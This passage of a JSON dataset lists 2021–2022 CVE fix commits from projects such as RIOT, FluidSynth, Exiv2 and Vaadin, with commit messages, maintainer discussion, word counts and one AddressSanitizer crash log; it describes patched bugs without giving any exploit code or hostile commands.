-C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netapi\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netif\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netif/ethernet\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netif/hdr\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netif/init_devs\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netreg\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/icmpv6\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/icmpv6/echo\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/icmpv6/error\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/ipv6\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/ipv6/hdr\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/ipv6/nib\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/ndp\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/pkt\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/pktbuf\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/pktbuf_malloc\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/pktdump\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/routing/rpl\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/transport_layer/udp\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/link_layer/eui_provider\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/link_layer/l2util\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/netif\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/network_layer/icmpv6\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/network_layer/ipv6/addr\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/network_layer/ipv6/hdr\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/transport_layer/udp\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/od\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/ps\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/random\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/random/tinymt32\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/shell\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/shell/commands\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/trickle\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/xtimer\r\n/usr/bin/ld: /home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking/bin/native/cpu/tramp.o: warning: relocation against `_native_isr_ctx' in read-only section `.text'\r\n/usr/bin/ld: warning: creating DT_TEXTREL in a PIE\r\n   text\t   data\t    bss\t    dec\t    hex\tfilename\r\n 602558\t  33344\t 105700\t 741602\t  b50e2\t/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking/bin/native/gnrc_networking.elf\r\nmake: Leaving directory '/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking'\r\n$ make -C examples/gnrc_networking term\r\nmake: Entering directory '/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking'\r\n/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking/bin/native/gnrc_networking.elf tap0 \r\nRIOT native interrupts/signals initialized.\r\nLED_RED_OFF\r\nLED_GREEN_ON\r\nRIOT native board initialized.\r\nRIOT native hardware initialization complete.\r\n\r\n==37430==WARNING: ASan doesn't fully support makecontext/swapcontext functions and may produce false positives in some cases!\r\nmain(): This is RIOT! (Version: 2021.04-devel-649-gf47b9)\r\nRIOT network stack example application\r\nAll up, running the shell now\r\n> ==37430==WARNING: ASan is ignoring requested __asan_handle_no_return: stack top: 0xfffef000; bottom 0x565fd000; size: 0xa99f2000 (-1449189376)\r\nFalse positive error reports may follow\r\nFor details see https://github.com/google/sanitizers/issues/189\r\n=================================================================\r\n==37430==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf4b00ef5 at pc 0x5659cec7 bp 0x5660d3a8 sp 0x5660d398\r\nREAD of size 1 at 0xf4b00ef5 thread T0\r\n    #0 0x5659cec6 in gnrc_rpl_validation_DAO /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/routing/rpl/gnrc_rpl_control_messages.c:116\r\n    #1 0x565a3cae in gnrc_rpl_recv_DAO /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/routing/rpl/gnrc_rpl_control_messages.c:1153\r\n    #2 0x565a88ea in _receive /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/routing/rpl/gnrc_rpl.c:190\r\n    #3 0x565a9111 in _event_loop /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/routing/rpl/gnrc_rpl.c:312\r\n    #4 0xf76b8258 in __makecontext (/usr/lib32/libc.so.6+0x48258)\r\n\r\n0xf4b00ef5 is located 0 bytes to the right of 5-byte region [0xf4b00ef0,0xf4b00ef5)\r\nallocated by thread T0 here:\r\n    #0 0xf79ee8f5 in __interceptor_malloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cpp:145\r\n\r\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/routing/rpl/gnrc_rpl_control_messages.c:116 in gnrc_rpl_validation_DAO\r\nShadow bytes around the buggy address:\r\n  0x3e960180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x3e960190: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x3e9601a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x3e9601b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x3e9601c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n=>0x3e9601d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[05]fa\r\n  0x3e9601e0: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fd\r\n  0x3e9601f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x3e960200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x3e960210: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x3e960220: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:       fa\r\n  Freed heap region:       fd\r\n  Stack left redzone:      f1\r\n  Stack mid redzone:       f2\r\n  Stack right redzone:     f3\r\n  Stack after return:      f5\r\n  Stack use after scope:   f8\r\n  Global redzone:          f9\r\n  Global init order:       f6\r\n  Poisoned by user:        f7\r\n  Container overflow:      fc\r\n  Array cookie:            ac\r\n  Intra object redzone:    bb\r\n  ASan internal:           fe\r\n  Left alloca redzone:     ca\r\n  Right alloca redzone:    cb\r\n  Shadow gap:              cc\r\n==37430==ABORTING\r\nmake: *** [/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking/../../Makefile.include:729: term] Error 1\r\nmake: Leaving directory '/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking'\r\n```\r\n\r\n</details> thanks @miri64 for this quick and detailed review :)",
            "pr_title_words": 8,
            "comments_words": 1235,
            "total_other_info_words": 1243
        },
        {
            "cve-id": "CVE-2021-33950",
            "commit_url": "https://github.com/openkm/document-management-system/commit/ce1d82329615aea6aa9f2cc6508c1fe7891e34b5",
            "commit_msg": "XXE injection security vulnerability\n\nFix #287",
            "commit_msg_words": 6,
            "other_info": "XXE injection security vulnerability",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-20302",
            "commit_url": "https://github.com/AcademySoftwareFoundation/openexr/commit/f044caeed5c0f1566d804f37cbddb2d5ccfd75ea",
            "commit_msg": "add exrcheck binary and function in IlmImfUtil\n\nSigned-off-by: Peter Hillman <peterh@wetafx.co.nz>",
            "commit_msg_words": 11,
            "other_info": "add exrcheck utility and hooks for fuzz testing",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-21410",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/668f244058644c79752ef8a0d24d45721b510021",
            "commit_msg": "Add buffer space checks for packet decompression.",
            "commit_msg_words": 7,
            "other_info": "Added buffer boundary checks for 6LoWPAN decompression",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-32844",
            "commit_url": "https://github.com/moby/hyperkit/commit/451558fe8aaa8b24e02e34106e3bb9fe41d7ad13",
            "commit_msg": "Fix vi_pci_write null vc_cfgwrite function pointer dereference (GHSL-2021-055)\n\nThis is a backport of what is done in bhyve.\n\nSigned-off-by: Frederic Dalleau <frederic.dalleau@docker.com>",
            "commit_msg_words": 22,
            "other_info": "Various fixes",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-46878",
            "commit_url": "https://github.com/fluent/fluent-bit/commit/8040e0b04e48d2cf1a2853e8ac2c2561e18c4a11",
            "commit_msg": "pack: fix type confusion bugs. Amongst other OSS-Fuzz 5136174263566336\n\nSigned-off-by: davkor <david@adalogics.com>",
            "commit_msg_words": 12,
            "other_info": "pack: fix type confusion bugs. Amongst other OSS-Fuzz 5136174263566336",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-21253",
            "commit_url": "https://github.com/bijaythapaa/OnlineVotingSystem/commit/0181cb0272857696c8eb3e44fcf6cb014ff90f09",
            "commit_msg": "Add a salt to SHA-256 hash",
            "commit_msg_words": 6,
            "other_info": "Add a salt to SHA-256 hash",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-21417",
            "commit_url": "https://github.com/FluidSynth/fluidsynth/commit/67596a87731dc593551975ca0268a438ab7410a2",
            "commit_msg": "Invalid generator were not removed from list\n\nfluid_list_remove() should receive the beginning of a list, so it can adjust the predecessor of the element to be removed. Otherwise the element would remain in the list, which in this case led to a use-after-free afterwards.",
            "commit_msg_words": 44,
            "other_info": "Invalid generators were not removed from zone list @veritas501 You may give it a test. Okay. It seems that the old bug has been fixed. I'm still testing if there are more bugs. @derselbst  I must admit I don't understand why this fixes the bug. `*hz` is a pointer to the first element in the zone list. So at the start it's effectively identical to the new `start_of_zone_list`. And `*hz` only gets changed if we encounter a global zone that is not first in list. In this case, the global zone moved to be first in that list and `*hz` is updated accordingly. So doing a `fluid_list_remove` on `*hz` should have the same effect as on the new `start_of_zone_list` pointer, shouldn't it?   > *hz is a pointer to the first element in the zone list.\r\n\r\nNo, `hz` is a pointer to pointer. `*hz` is (usually) equal to `p2`. So, it would have been like putting\r\n `fluid_list_remove(p2, p2->data);` Ah, of course! Hm... then I have a hard time understanding the purpose of `hz` in the first place, and when it gets updated. I guess I need more time going through this again. That code reads a little like it's been deliberately obfuscated :-) I once had the impression that I understand what's going on, but that was a long time ago... \r\n\r\n The purpose of `hz` is not quite clear to me as well. It could be a leftover when they passed `hz` to a separate function that removed the zone:\r\n\r\nhttps://github.com/FluidSynth/fluidsynth/blob/62e375c71c815ca12f859b8722db5dff12f0c897/fluidsynth/src/sfloader/fluid_defsfont.c#L2443\r\n\r\nThe core logic around it already exists since \"Initial Revision\", so I'm a bit cautious to touch it. It would probably be a good idea to write a bunch of test cases, before changing it. Looking into `load_pgen()` some more, I think the logic behind that `hz` pointer is completely broken... and not just in the place where this PR introduces a fix. It's purpose is to be able to move a global zones that is not the first zone in a preset to the beginning of the zone list. But as `*hz` points to the local `p2` variable (i.e. the current entry in the zone list), the `preset->zone` list is not updated correctly. I don't see how the global zone relocation code will ever have run. As far as I understand it, the following check will always be false, because `*hz` and `p2` point to the same memory location:\r\nhttps://github.com/FluidSynth/fluidsynth/blob/b8fb6c81e1ca27c0bba2f6a0168832214f91d497/src/sfloader/fluid_sffile.c#L1517\r\n\r\nAnd looking back through the history of this code, I arrive at the initial commit which has the same behaviour. So I guess we could either remove the relocation code altogether, or fix try to fix it. > It's purpose is to be able to move a global zones that is not the first zone in a preset to the beginning of the zone list.\r\n\r\nYes, I also had the feeling it has to do with moving around zones. I also don't see how `(*hz != p2)` can ever evaluate to true.\r\n\r\n> And looking back through the history of this code, I arrive at the initial commit which has the same behaviour\r\n\r\nI arrived at iiwusynth: https://cvs.savannah.nongnu.org/viewvc/iiwusynth/iiwusynth/src/iiwu_defsfont.c?revision=1.1&view=markup\r\n\r\nWe could ask Peter, I'm sure he will remeber what he did 19 years ago :D\r\n\r\n> So I guess we could either remove the relocation code altogether, or fix try to fix it.\r\n\r\nI think we should fix it. Ideally by creating test cases. But this will take time. I would prefer to merge this and release 2.1.8 afterwards (even if it's not perfectly correct). Yes, or like that :-) That should do it, at least until we cleanup this code properly. Great! Then I will complete this tomorrow, to give @veritas501  the chance to report back.",
            "pr_title_words": 8,
            "comments_words": 609,
            "total_other_info_words": 617
        },
        {
            "cve-id": "CVE-2021-32843",
            "commit_url": "https://github.com/moby/hyperkit/commit/df0e46c7dbfd81a957d85e449ba41b52f6f7beb4",
            "commit_msg": "Fix vi_pci_read null vc_cfgread function pointer dereference (GHSL-2021-054)\n\nThis is backport of what is done in bhyve\n\nSigned-off-by: Frederic Dalleau <frederic.dalleau@docker.com>",
            "commit_msg_words": 21,
            "other_info": "Various fixes",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-41130",
            "commit_url": "https://github.com/cloudendpoints/esp/commit/e310c4f91d229a072507f80c73811489b4cdff27",
            "commit_msg": "Remove X-Endpoint-API-UserInfo for all header occurrences. (#845)",
            "commit_msg_words": 7,
            "other_info": "Remove X-Endpoint-API-UserInfo for all header occurrences.",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-3836",
            "commit_url": "https://github.com/dbeaver/dbeaver/commit/4debf8f25184b7283681ed3fb5e9e887d9d4fe22",
            "commit_msg": "dbeaver/dbeaver-ee#1166 prevent XXE",
            "commit_msg_words": 3,
            "other_info": "dbeaver/dbeaver-ee#1166 prevent XXE @akilovich - @srikanthprathi has requested a CVE for this report (https://www.huntr.dev/bounties/a98264fb-1930-4c7c-b774-af24c0175fd4/)...\r\n\r\nAre you happy for us to go ahead and arrange this? @JamieSlome Hi. I don't quite understand what you mean. Can you elaborate on this a little bit?  @akilovich - sure \ud83d\udc4d \r\n\r\nBecause @srikanthprathi disclosed a valid security vulnerability to us, we are able to create a CVE for this report.\r\n\r\nA CVE notifies developers using your package about this vulnerability, and the version that patches it as well.\r\n\r\nYou can read more about it [here](https://www.redhat.com/en/topics/security/what-is-cve). @JamieSlome Yes, you can proceed. @akilovich - CVE published! \ud83c\udf89 \r\n\r\n`CVE-2021-3836`",
            "pr_title_words": 3,
            "comments_words": 98,
            "total_other_info_words": 101
        },
        {
            "cve-id": "CVE-2021-32728",
            "commit_url": "https://github.com/nextcloud/desktop/commit/7fb09a81632de6066e55def20308d6e61cadbc48",
            "commit_msg": "check e2ee public key against private one\n\nshould ensure we have matching private/public keys\n\nSigned-off-by: Matthieu Gallien <matthieu_gallien@yahoo.fr>",
            "commit_msg_words": 18,
            "other_info": "check e2ee public key against private one /rebase /rebase /rebase AppImage file: [Nextcloud-PR-3338-7fb09a81632de6066e55def20308d6e61cadbc48-x86_64.AppImage](https://github.com/nextcloud-desktop-bot/ci-builds/releases/download/PR-3338/Nextcloud-PR-3338-7fb09a81632de6066e55def20308d6e61cadbc48-x86_64.AppImage) <br/><br/>To test this change/fix you can simply download above AppImage file and test it. <br/><br/>Please make sure to quit your existing Nextcloud app and backup your data.",
            "pr_title_words": 7,
            "comments_words": 33,
            "total_other_info_words": 40
        },
        {
            "cve-id": "CVE-2021-21282",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/f0bb7f314c424630837d2ed08ec0bc90e1ccb15e",
            "commit_msg": "Validate the segments_left field in the SRH.",
            "commit_msg_words": 7,
            "other_info": "Validate Source Routing Header (SRH) parameter",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-33604",
            "commit_url": "https://github.com/vaadin/flow/commit/2a801c42b406a00c44f4a85b4b4e4a4c5bf89adc",
            "commit_msg": "fix: prevent passing bad character to dev-server\n\nThe webpack dev-server does not escape \" character, as it is not valid\nURL. This limitation was not checked when passing request to it via\nDevModeHandlerImpl.",
            "commit_msg_words": 33,
            "other_info": "fix: prevent passing bad character to dev-server Formatter run and hopefully ccdm tests pass this time too SonarQube analysis reported 7 issues\n\n1. ![MAJOR][MAJOR] [HandlerHelper.java#L408](https://github.com/vaadin/flow/blob/eb24d8c7938c71961b6bd7210a78937a674168d4/flow-server/src/main/java/com/vaadin/flow/server/HandlerHelper.java#L408): Define and throw a dedicated exception instead of using a generic one. [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3AS00112)\n1. ![MAJOR][MAJOR] [DevModeHandlerImpl.java#L1](https://github.com/vaadin/flow/blob/eb24d8c7938c71961b6bd7210a78937a674168d4/vaadin-dev-server/src/main/java/com/vaadin/base/devserver/DevModeHandlerImpl.java#L1): Class com.vaadin.base.devserver.DevModeHandlerImpl defines non-transient non-serializable instance field devServerStartFuture [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=findbugs%3ASE_BAD_FIELD)\n1. ![MAJOR][MAJOR] [DevModeHandlerImpl.java#L157](https://github.com/vaadin/flow/blob/eb24d8c7938c71961b6bd7210a78937a674168d4/vaadin-dev-server/src/main/java/com/vaadin/base/devserver/DevModeHandlerImpl.java#L157): Make \"devServerStartFuture\" transient or serializable. [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3AS1948)\n1. ![MAJOR][MAJOR] [DevModeHandlerImpl.java#L249](https://github.com/vaadin/flow/blob/eb24d8c7938c71961b6bd7210a78937a674168d4/vaadin-dev-server/src/main/java/com/vaadin/base/devserver/DevModeHandlerImpl.java#L249): Null passed for non-null parameter of java.util.concurrent.CompletableFuture.getNow(Object) in com.vaadin.base.devserver.DevModeHandlerImpl.handleRequest(VaadinSession, VaadinRequest, VaadinResponse) [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=findbugs%3ANP_NONNULL_PARAM_VIOLATION)\n1. ![MAJOR][MAJOR] [DevModeHandlerImpl.java#L581](https://github.com/vaadin/flow/blob/eb24d8c7938c71961b6bd7210a78937a674168d4/vaadin-dev-server/src/main/java/com/vaadin/base/devserver/DevModeHandlerImpl.java#L581): Remove this unused private \"checkPort\" method. [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3AUnusedPrivateMethod)\n1. ![MAJOR][MAJOR] [DevModeHandlerImpl.java#L718](https://github.com/vaadin/flow/blob/eb24d8c7938c71961b6bd7210a78937a674168d4/vaadin-dev-server/src/main/java/com/vaadin/base/devserver/DevModeHandlerImpl.java#L718): Either re-interrupt this method or rethrow the \"InterruptedException\". [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3AS2142)\n1. ![INFO][INFO] [HandlerHelper.java#L420](https://github.com/vaadin/flow/blob/eb24d8c7938c71961b6bd7210a78937a674168d4/flow-server/src/main/java/com/vaadin/flow/server/HandlerHelper.java#L420): Public static com.vaadin.flow.server.HandlerHelper.getPublicResources() may expose internal representation by returning HandlerHelper.publicResources [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=findbugs%3AMS_EXPOSE_REP)\n\n[INFO]: https://sonarsource.github.io/sonar-github/severity-info.png 'Severity: INFO'\n[MAJOR]: https://sonarsource.github.io/sonar-github/severity-major.png 'Severity: MAJOR' Hi @pleku , this commit cannot be picked to 7.0 by this bot, can you take a look and pick it manually?\n Error Message: Error: Command failed: git cherry-pick f18ea9a4e4f9d2347d24e7e98fdefe84a3cfbed1\nerror: could not apply f18ea9a4e4... fix: prevent passing bad character to dev-server (#11099)\nhint: after resolving the conflicts, mark the corrected paths\nhint: with 'git add <paths>' or 'git rm <paths>'\nhint: and commit the result with 'git commit'\n Hi @pleku , this commit cannot be picked to 6.0 by this bot, can you take a look and pick it manually?\n Error Message: Error: Command failed: git cherry-pick f18ea9a4e4f9d2347d24e7e98fdefe84a3cfbed1\nerror: could not apply f18ea9a4e4... fix: prevent passing bad character to dev-server (#11099)\nhint: after resolving the conflicts, mark the corrected paths\nhint: with 'git add <paths>' or 'git rm <paths>'\nhint: and commit the result with 'git commit'\n Hi @pleku , this commit cannot be picked to 2.7 by this bot, can you take a look and pick it manually?\n Error Message: Error: Command failed: git cherry-pick f18ea9a4e4f9d2347d24e7e98fdefe84a3cfbed1\nerror: could not apply f18ea9a4e4... fix: prevent passing bad character to dev-server (#11099)\nhint: after resolving the conflicts, mark the corrected paths\nhint: with 'git add <paths>' or 'git rm <paths>'\nhint: and commit the result with 'git commit'\n Hi @pleku , this commit cannot be picked to 2.6 by this bot, can you take a look and pick it manually?\n Error Message: Error: Command failed: git cherry-pick f18ea9a4e4f9d2347d24e7e98fdefe84a3cfbed1\nerror: could not apply f18ea9a4e4... fix: prevent passing bad character to dev-server (#11099)\nhint: after resolving the conflicts, mark the corrected paths\nhint: with 'git add <paths>' or 'git rm <paths>'\nhint: and commit the result with 'git commit'\n This ticket/PR has been released with platform 21.0.0.alpha3. For prerelease versions, it will be included in its final version.",
            "pr_title_words": 7,
            "comments_words": 406,
            "total_other_info_words": 413
        },
        {
            "cve-id": "CVE-2021-33185",
            "commit_url": "https://github.com/SerenityOS/serenity/commit/e8cc105a54ca7ab1859dbb1afee87c5d95c0284a",
            "commit_msg": "AK: Don't read past the end in BitmapView::count_in_range()\n\nThe current code is factored such that reads to the entirety of the last\nbyte should be dropped. This was relying on the fact that last would be\none past the end in that case. Instead of actually reading that byte\nwhen it's completely out of bounds of the bitmask, just skip reads that\nwould be invalid. Add more tests to make sure that the behavior is\ncorrect for byte aligned reads of byte aligned bitmaps.",
            "commit_msg_words": 84,
            "other_info": "Tests/CI: Resolve ASAN/UBSAN errors and run with Sanitizers in CI Note that building with ASAN and UBSAN significantly increases the Lagom build times.. not sure what can be done about that. It seems very valuable to run with sanitizers in CI. > Note that building with ASAN and UBSAN significantly increases the Lagom build times.. not sure what can be done about that. It seems very valuable to run with sanitizers in CI.\r\n\r\nlooks like building lagom with sanitizers is still faster than building serenity for on-target tests, so that doesnt really matter :) > I believe this commit breaks BitMapView::count_in_range() when doing multiples of 8, showing a count that is missing the last byte. I was looking at this bug earlier and had added some more tests, for example:\r\n> \r\n> ```\r\n> Bitmap bitmap(16, true);\r\n> EXPECT_EQ(bitmap.count_in_range(0,16,true),16u);\r\n> ```\r\n> \r\n> Fails with\r\n> `EXPECT_EQ(bitmap.count_in_range(0,16,true), 16u) failed with lhs=8 and rhs=16`\r\n> \r\n> ```\r\n> Bitmap bitmap(16, true);\r\n> EXPECT_EQ(bitmap.count_in_range(8,8,true),8u);\r\n> ```\r\n> \r\n> Fails with\r\n> `EXPECT_EQ(bitmap.count_in_range(8,8,true), 8u) failed with lhs=0 and rhs=8`\r\n\r\nSo it does. Dang. Thanks. Back to the drawing board. @metmo I tried to request a re-review through the gitlab UI but it doesn't seem to be showing up \ud83e\udd37\u200d\u2642\ufe0f  So sorry if it spammed you. Anyway, I think this new strategy should be correct, and I added more test cases similar to the ones you posted.",
            "pr_title_words": 10,
            "comments_words": 223,
            "total_other_info_words": 233
        },
        {
            "cve-id": "CVE-2021-37619",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/9be257340193dbe3fb810aa33531c40ae9df6414",
            "commit_msg": "Fix incorrect loop condition.",
            "commit_msg_words": 4,
            "other_info": "Fix incorrect loop condition",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-36144",
            "commit_url": "https://github.com/projectacrn/acrn-hypervisor/commit/dd88504804e186029f845a166dc5c31695e2cca2",
            "commit_msg": "dm: Reset virtio device before release\n\nWith virtio polling mode enabled, a timer is running in the virtio\nbackend service. And the timer will also be triggered if its frondend\ndriver didn't do the device reset in shutdown. A freed virtio device\nwill be accessed in the polling timer handler.\n\nDo the virtio reset() callback specifically to clear the polling timer\nbefore the free.\n\nTracked-On: #6147\nSigned-off-by: Shuo A Liu <shuo.a.liu@intel.com>\nSigned-off-by: Yonghua Huang <yonghua.huang@intel.com>",
            "commit_msg_words": 75,
            "other_info": "dm: Reset virtio device before release @shuox  @ywan170  this PR to back backport from release_2.5 branch, please review. No new violations to the coding guideline detected.<br>No New Name Conflict<br>No New Function Declaration/Definition Mismatch",
            "pr_title_words": 6,
            "comments_words": 27,
            "total_other_info_words": 33
        },
        {
            "cve-id": "CVE-2021-37621",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/d9fd4c4272df172ae89c0a9c41341adc75ebba86",
            "commit_msg": "Defensive programming in Image::printIFDStructure",
            "commit_msg_words": 4,
            "other_info": "0.27 maintenance Thank you for reporting this.  And even more thanks for providing a patch.  I'm very pleased to accept your pull request.  The Exiv2 project moved to Git with the release of v0.26 on 2017-04-28.  You have the honour of the first \"pull request\".  Congratulations and Thank You.\r\n\r\nAnd thanks for your observation that CMAKE_INSTALL_MANDIR is already in use.  The CMake files have been an accumulation of contributions by about 10 engineers over about 10 years.  Our nightly build uses CMake, so I have lots of confidence that it works.  However, if you are a CMake fan, I would highly value any observations or contribution you'd care to make concerning our CMakeList.txt files.",
            "pr_title_words": 2,
            "comments_words": 112,
            "total_other_info_words": 114
        },
        {
            "cve-id": "CVE-2021-46854",
            "commit_url": "https://github.com/proftpd/proftpd/commit/10a227b4d50e0a2cd2faf87926f58d865da44e43",
            "commit_msg": "mod_radius: copy _only_ the password",
            "commit_msg_words": 5,
            "other_info": "mod_radius: copy _only_ the password",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-3798",
            "commit_url": "https://github.com/opencryptoki/opencryptoki/commit/4e3b43c3d8844402c04a66b55c6c940f965109f0",
            "commit_msg": "SOFT: Check the EC Key on C_CreateObject and C_DeriveKey\n\nWhen constructing an OpenSSL EC public or private key from PKCS#11\nattributes or ECDH public data, check that the key is valid, i.e. that\nthe point is on the curve.\n\nThis prevents one from creating an EC key object via C_CreateObject with\ninvalid key data. It also prevents C_DeriveKey to derive a secret using\nECDH with an EC public key (public data) that uses a different curve\nor is invalid by other means.\n\nSigned-off-by: Ingo Franzki <ifranzki@linux.ibm.com>",
            "commit_msg_words": 86,
            "other_info": "SOFT: Check the EC Key on C_CreateObject and C_DeriveKey According to @p-steuer `EC_KEY_check_key()` is sufficient, and we should not do an additional `EC_POINT_is_on_curve()` check, since there is a cost associated with doing checking this twice.\r\n\r\nI have changed the code accordingly.",
            "pr_title_words": 9,
            "comments_words": 32,
            "total_other_info_words": 41
        }
    ],
    "2022": [
        {
            "cve-id": "CVE-2022-1899",
            "commit_url": "https://github.com/radareorg/radare2/commit/193f4fe01d7f626e2ea937450f2e0c4604420e9d",
            "commit_msg": "Fix integer overflow in string search causing oobread ##crash\n\n* Reported by @greatergoodest via huntrdev\r\n* BountyID: 8a3dc5cb-08b3-4807-82b2-77f08c137a04\r\n* Reproducer bfileovf",
            "commit_msg_words": 21,
            "other_info": "Ovf",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2022-39311",
            "commit_url": "https://github.com/gocd/gocd/commit/7b88b70d6f7f429562d5cab49a80ea856e34cdc8",
            "commit_msg": "Disable RMI endpoint by default\n\nThis endpoint can be enabled by including `gocd.agent.remoting.legacy=true` in the\n`-Dgocd.agent.extra.properties` property for the server process.",
            "commit_msg_words": 21,
